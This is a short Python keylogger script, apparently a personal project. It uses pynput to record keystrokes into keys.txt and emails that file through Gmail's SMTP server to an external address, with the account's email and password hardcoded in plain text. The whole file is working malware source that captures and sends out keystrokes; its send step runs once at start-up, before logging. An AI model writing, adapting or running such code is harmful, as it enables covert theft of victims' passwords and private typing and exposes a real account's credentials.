import pynput
import time
import os
from pynput.keyboard import Key, Listener

# Import smtplib for the actual sending function
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromAddress = "keymasterkeylogger@gmail.com"
password = "Jg#YHT5n6XDR#KZ"

toAddress = "keymasterkeylogger@gmail.com"

key_info = "keys.txt"
file_path = "C:\\Users\\HP\\PycharmProjects\\pythonProject\\KeyloggerProject\\keys.txt"
extend = "\\"

msg = MIMEMultipart()

msg['from'] = fromAddress

msg['To'] = toAddress

msg['subject'] = "keys_info"

body = "Body_of_the_Email"

msg.attach(MIMEText(body, 'plain'))

filename = "keys.txt"
attachment = open(filename, 'rb')

p = MIMEBase('application', 'octet_stream ')

p.set_payload((attachment).read())

encoders.encode_base64(p)

p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

# attach the instance 'p' to instance 'msg'
msg.attach(p)

# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)

# start TLS for security
s.starttls()

# Authentication
s.login(fromAddress, password)

# Converts the Multipart msg into a string
text = msg.as_string()

# sending the mail
s.sendmail(fromAddress, toAddress, text)

# terminating the session
s.quit()


count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys_info):
    with open("keys.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key.Enter") > 0:
                f.write("\n")
            elif k.find("key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
